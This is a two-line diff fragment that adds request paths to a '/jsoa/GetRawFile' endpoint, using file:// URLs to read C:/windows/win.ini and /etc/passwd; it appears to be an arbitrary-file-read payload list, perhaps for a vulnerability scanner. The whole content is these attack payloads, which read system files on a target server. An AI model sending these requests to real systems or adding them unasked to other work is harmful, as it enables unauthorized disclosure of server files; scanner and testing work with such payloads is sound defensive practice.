@@ -1,0 +1,2 @@
+/jsoa/GetRawFile?url=file:///C:/windows/win.ini
+/jsoa/GetRawFile?url=file:///etc/passwd
